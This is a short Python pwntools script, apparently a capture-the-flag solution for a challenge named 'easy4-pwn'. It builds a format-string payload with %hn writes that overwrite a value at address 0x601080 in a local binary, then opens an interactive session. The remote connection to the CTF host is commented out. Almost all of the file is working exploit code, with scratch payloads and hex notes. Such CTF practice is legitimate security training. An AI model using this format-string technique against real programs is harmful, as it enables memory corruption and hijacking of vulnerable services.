from pwn import *



s_addr=0x0000000000601080
s_addr=b"\x80\x10\x60\x00\x00\x00\x00\x00"
s_addr2=b"\x84\x10\x60\x00\x00\x00\x00\x00"
p=process("./main")
#p=remote("easy4-pwn.athack-ctf.com",1337)
'''exp=b"       "
exp+=b"%29499x"
exp+=b" %9$p"
exp+=b"%45101x"
exp+=b" %10$p"
exp+=b"A"*8
exp+=b"B"*8'''


exp=b"      "
exp+=b"%15163x"
exp+=b"%10$hn"
exp+=b"%59359x"
exp+=b"%11$hn"
exp+=s_addr
exp+=s_addr2
print(exp)
print(len(exp))
raw_input()
p.sendline(exp)
p.interactive()
#3b 73 68 23
#3b68733b
#3b22
#2320

